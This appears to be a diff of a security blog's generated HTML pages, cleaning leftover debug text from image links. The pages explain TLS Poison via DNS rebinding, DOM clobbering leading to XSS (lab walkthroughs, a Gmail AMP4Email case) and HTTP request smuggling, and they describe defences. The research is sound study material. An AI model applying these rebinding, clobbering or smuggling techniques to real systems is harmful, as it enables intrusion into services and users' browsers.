 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/1_hu15458388029200449309.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/1_hu18054389309612463769.png 1024w"
@@ -3528,8 +3503,7 @@ data-flex-basis="1126px"
 &lt;p>对于 IPv4-mapped IPv6 这类地址，我认为并不是真正意义上的 v6 地址，真正 v6 的 loopback 地址为 ::1 ，IPv4-mapped IPv6 只是 IPv4 地址写成 IPv6 形式。那么既然并不是真正的 IPv6 ，但是写作了 IPv6 ，我觉得对于&lt;code>getaddrinfo&lt;/code>来说，他确实是 IPv6 的结构，但是对于 IPv6 来说，真正的回环地址并不是这个，所以他可能被视为普通的 IPv6 地址处理。&lt;/p>
 &lt;p>我们可以简单验证一下自己的想法：直接在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。&lt;/p>
 &lt;p>使用 curl 请求我们设置的域名，得到的结果如下图所示：&lt;/p>
-&lt;p>Permalink before if: /Part2/11.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/11.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/11.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/11.png"
 width="851"
 height="936"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/11_hu5898879440786311386.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/11_hu11372767341399035893.png 1024w"
@@ -3550,8 +3524,7 @@ data-flex-basis="218px"
 &lt;/h3>&lt;p>2021/05/14 更新：&lt;/p>
 &lt;p>我们可以尝试一下使用 IPv4-Mapped 这类地址进行实验看看能不能写入 Memcached，同样的 DNS 配置：在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。&lt;/p>
 &lt;p>然后其他操作基本同双 A 记录实验方式一致，使用 proxy.py 拒绝客户端对 TLS 服务端的第二次请求以达到 DNS Rebinding 的效果，于是得到的实验结果如下图所示：&lt;/p>
-&lt;p>Permalink before if: /Part2/12.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/12.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/12.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/12.png"
 width="1920"
 height="1080"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/12_hu11408955634807298998.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part2/12_hu17027973144781445545.png 1024w"
@@ -3565,8 +3538,7 @@ data-flex-basis="426px"
 &lt;/h2>&lt;p>纵观整个漏洞，我觉得其实造成这个漏洞是由于比较多复杂的因素导致的，从协议角度来说，在 RFC 当中也并没有提到 Client 到底应该怎么存储 Server 给予的相关凭证，也并没有说明清楚怎么与对应的 TLS 会话绑定，所以导致了 Client 在支持 TLS 会话重用的产生了各种实现；而从 Client 客户端漏洞来说，也是开发者们没有对进行 TLS 会话重用的地址进行二次校验，导致了可以使用 DNS Rebinding 来轻松绕过。&lt;/p>
 &lt;p>所以，对于该类漏洞首要的防护手段就是需要确认进行 TLS 会话重用的地址与之前的地址一致，而这个实现途径有很多种方式，比如说防御 DNS Rebinding 的方式能在一定程度上缓解到整个漏洞利用，但是对于 DNS Rebinding 的传统防守方式有些小伙伴可能会说 Client 只做一次 DNS 解析，之后就一直使用这个 IP 解析结果，但是如果 Client 存在像文中那样的挨个尝试建立连接后使用第一个连接成功的 IP 的现象的话，我们就可以使用上文提到的双 A 记录的方式来绕过该类限制。&lt;/p>
 &lt;p>那怎么做才是最好呢？作者在防御章节做出了自己阐述：&lt;/p>
-&lt;p>Permalink before if: /Part3/3.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/3.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/3.jpg"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/3.jpg"
 width="4000"
 height="2250"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/3_hu1073530945713690802.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/Part3/3_hu2405610395764893427.jpg 1024w"
@@ -3748,23 +3720,23 @@ position: relative;
 &lt;h2 id="simple-example">Simple Example
 &lt;/h2>&lt;p>其实 Dom Clobbering 比较简单，我们看几个简单的例子就能知道它是干什么了的。&lt;/p>
 &lt;h3 id="exmaple-1---create">Exmaple 1 - Create
-&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png"
+&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225164841.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们可以看到通过 id 或者 name 属性，我们可以在&lt;code>document&lt;/code>或者&lt;code>window&lt;/code>对象下创建一个对象。&lt;/p>
 &lt;h3 id="example-2---overwrite">Example 2 - Overwrite
-&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png"
+&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200222145150.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到&lt;code>document.cookie&lt;/code>已经被我们用 img 标签给覆盖了&lt;/p>
 &lt;h3 id="example-3---overwrite2">Example 3 - Overwrite2
-&lt;/h3>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png"
+&lt;/h3>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225165624.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们通过多层覆盖掉了&lt;code>document.body.appendChild&lt;/code>方法。&lt;/p>
 &lt;h2 id="attack-method">Attack Method
 &lt;/h2>&lt;p>既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个&lt;code>HTMLElment&lt;/code>对象。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。&lt;/p>
@@ -3785,7 +3757,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们可以得到两种标签对象：&lt;code>HTMLAreaElement (&amp;lt;area&amp;gt;)&lt;/code>&amp;amp; &lt;code>HTMLAnchorElement (&amp;lt;a&amp;gt;)&lt;/code>，这两个标签对象我们都可以利用&lt;code>href&lt;/code>属性来进行字符串转换。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="htmlcollection">HTMLCollection
@@ -3856,7 +3828,7 @@ getter Element? namedItem(DOMString name);
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="html-relationships">HTML Relationships
@@ -4166,7 +4138,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们再随便评论一下就好了，就可以触发我们构造的 XSS 了。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="labclobbering-dom-attributes-to-bypass-html-filters">Lab:Clobbering DOM attributes to bypass HTML filters
@@ -4508,7 +4480,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>把它当作评论提交&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用&lt;code>iframe&lt;/code>进行&lt;code>setTimeout&lt;/code>&lt;/p>
@@ -4521,7 +4493,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里要注意一定要得等评论加载完毕再用&lt;code>#x&lt;/code>选择&lt;code>form&lt;/code>，所以这里的 500ms 需要根据自己的网络情况适当调整。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="cve-2017-0928-bypassing-sanitization-using-dom-clobbering">CVE-2017-0928 Bypassing sanitization using DOM clobbering
@@ -4569,15 +4541,15 @@ loading="lazy"
 &lt;/div>&lt;p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。&lt;/p>
 &lt;h3 id="xss-in-gmails-amp4email-via-dom-clobbering">XSS in GMail’s AMP4Email via DOM Clobbering
 &lt;/h3>&lt;p>终于到了我们开头提到的 OWASP Top 10 提名的攻击实例了，作者首先通过直接在控制台输入 window 进行 fuzz&lt;/p>
-&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png"
+&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里他首先利用了&lt;code>AMP&lt;/code>，尝试插入&lt;code>&amp;lt;a id=AMP&amp;gt;&lt;/code>，但是这个&lt;code>AMP&lt;/code>被 ban 了&lt;/p>
-&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png"
+&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>接着找到下一个&lt;code>AMP_MODE&lt;/code>，这个没有被 ban ，反而让作者发现了这里加载失败的 URL 当中有一个&lt;code>undefined&lt;/code>&lt;/p>
-&lt;p>Permalink before if: https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png"
+&lt;p>&lt;img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这就是作者插入了&lt;code>&amp;lt;a id=AMP_MODE&amp;gt;&lt;/code>导致产生的&lt;code>undefined&lt;/code>，主要产生这个问题的代码经作者简化后是这样的：&lt;/p>
@@ -5389,8 +5361,7 @@ loading="lazy"
 &lt;p>In the future, if there is a new summary, I will also send my &lt;a class="link" href="https://zeddyu.github.io" target="_blank" rel="noopener"
 >blog&lt;/a>.&lt;/p>
 &lt;h2 id="tlnr">TL;NR
-&lt;/h2>&lt;p>Permalink before if: /20200520131941.jpg
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131941.jpg&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131941.jpg"
+&lt;/h2>&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131941.jpg"
 width="1931"
 height="1086"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131941_hu17373197762719500899.jpg 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131941_hu18099035545153793595.jpg 1024w"
@@ -5434,8 +5405,7 @@ data-flex-basis="426px"
 &lt;p>Nowadays, the browser does not enable &lt;code>Pipeline&lt;/code> by default, but the general server provides support for &lt;code>Pipleline&lt;/code>.&lt;/p>
 &lt;/blockquote>
 &lt;p>The more important introduction in HTTP / 1.1 is the pipeline technology. The following is a comparison chart with and without piepeline technology:&lt;/p>
-&lt;p>Permalink before if: /20200520134869.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134869.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134869.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134869.png"
 width="2560"
 height="1780"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134869_hu15786274669675840856.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134869_hu10072055246211086544.png 1024w"
@@ -5577,8 +5547,7 @@ response if that amount is exceeded.&lt;/p>
 &lt;p>​ In order to improve the user&amp;rsquo;s browsing speed, improve the user experience, and reduce the burden on the server, many websites use the CDN acceleration service. The simplest acceleration service is to add a reverse proxy server with caching function in front of the source station. When the user requests some static resources, it can be obtained directly from the proxy server without having to obtain it from the source server. This has a very typical topology.&lt;/p>
 &lt;/blockquote>
 &lt;p>Here is a picture from @mengchen :&lt;/p>
-&lt;p>Permalink before if: /20200520133872.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520133872.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520133872.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520133872.png"
 width="532"
 height="401"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520133872_hu17862608627025757120.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520133872_hu6108366063215586181.png 1024w"
@@ -5588,8 +5557,7 @@ data-flex-grow="132"
 data-flex-basis="318px"
 >&lt;/p>
 &lt;p>Generally speaking, the reverse proxy and back-end server will not use pipeline technology, or even keep-alive. The measures taken by the reverse proxy is to reuse the TCP connection, because compare with the reverse proxy and back-end server, the reverse proxy server and the back-end server IP are relatively fixed, and requests from different users establish a link with the back-end server through the proxy server, and the TCP link between the two is reused.&lt;/p>
-&lt;p>Permalink before if: /20200520139456.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139456.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139456.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139456.png"
 width="1836"
 height="1350"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139456_hu11969370368094243692.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139456_hu3842289176341489386.png 1024w"
@@ -5598,8 +5566,7 @@ class="gallery-image"
 data-flex-grow="136"
 data-flex-basis="326px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520130675.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130675.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130675.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130675.png"
 width="1770"
 height="1325"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130675_hu16689001851918394065.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520130675_hu16977744778374138556.png 1024w"
@@ -5608,8 +5575,7 @@ class="gallery-image"
 data-flex-grow="133"
 data-flex-basis="320px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520134020.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134020.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134020.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134020.png"
 width="1830"
 height="1354"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134020_hu14829105589618077840.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134020_hu18234339854701024355.png 1024w"
@@ -5989,8 +5955,7 @@ data-flex-basis="324px"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>And HTTP/0.9 request and response packets do not have headers. Such as:&lt;/p>
-&lt;p>Permalink before if: /20200520134497.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134497.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134497.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134497.png"
 width="1832"
 height="1211"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134497_hu16233424091696251524.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134497_hu11661291159794483310.png 1024w"
@@ -6000,8 +5965,7 @@ data-flex-grow="151"
 data-flex-basis="363px"
 >&lt;/p>
 &lt;p>Because HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling.&lt;/p>
-&lt;p>Permalink before if: /20200520136500.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136500.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136500.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136500.png"
 width="1813"
 height="1313"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136500_hu10823664623449974099.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520136500_hu11225707297767896227.png 1024w"
@@ -6011,8 +5975,7 @@ data-flex-grow="138"
 data-flex-basis="331px"
 >&lt;/p>
 &lt;p>The meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist:&lt;/p>
-&lt;p>Permalink before if: /20200520134449.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134449.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134449.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134449.png"
 width="1785"
 height="1222"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134449_hu3011656440066536833.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520134449_hu14295792101022499174.png 1024w"
@@ -6021,8 +5984,7 @@ class="gallery-image"
 data-flex-grow="146"
 data-flex-basis="350px"
 >&lt;/p>
-&lt;p>Permalink before if: /20200520139919.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139919.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139919.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139919.png"
 width="1762"
 height="1253"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139919_hu5446011284956101209.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520139919_hu8333542771391146391.png 1024w"
@@ -6032,8 +5994,7 @@ data-flex-grow="140"
 data-flex-basis="337px"
 >&lt;/p>
 &lt;p>The above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified &lt;code>Range: bytes=24-33664&lt;/code>, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response.&lt;/p>
-&lt;p>Permalink before if: /20200520131041.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131041.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131041.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131041.png"
 width="1594"
 height="1197"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131041_hu974399956838840126.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/help-you-understand-http-smuggling-in-one-article/20200520131041_hu1902612685999240932.png 1024w"
@@ -6222,7 +6183,7 @@ the origination timestamp for the message in which it appears.&lt;/p>
 &lt;/div>
 &lt;/div>&lt;p>We don&amp;rsquo;t need to know much about other codes. Here we can know that white space is treated the same as &lt;code>:&lt;/code> colon, that is, if there is a space, the field name before &lt;code>:&lt;/code> will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur.&lt;/p>
 &lt;p>@ Bi3g0 built a clearer schematic of the vulnerability:&lt;/p>
-&lt;p>Permalink before if: https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png&lt;img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png"
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>The example used here is to use ELB as the front server and Netty as the backend server. We send the following request:&lt;/p>
@@ -6291,8 +6252,7 @@ loading="lazy"
 &lt;/h3>&lt;p>In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. &lt;a class="link" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener"
 >Labs-HTTP request smuggling&lt;/a>&lt;/p>
